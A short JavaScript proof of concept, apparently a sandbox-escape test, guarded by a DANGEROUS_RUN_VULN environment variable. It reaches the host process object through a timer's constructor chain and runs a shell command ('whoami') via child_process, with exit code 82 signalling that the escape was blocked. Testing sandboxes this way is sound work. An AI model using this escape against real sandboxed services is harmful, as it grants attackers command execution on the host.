if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (
		error.message === "process is not defined" ||
		error.message === "Code generation from strings disallowed for this context"
	) {
		process.exit(82);
	}

	process.exit(1);
});

(function () {
	exports.process = setTimeout(() => {})
		.ref()
		.constructor.constructor("return process")();
	console.log(
		exports.process.mainModule
			.require("child_" + "process")
			.execSync("whoami")
			.toString(),
	);
})();
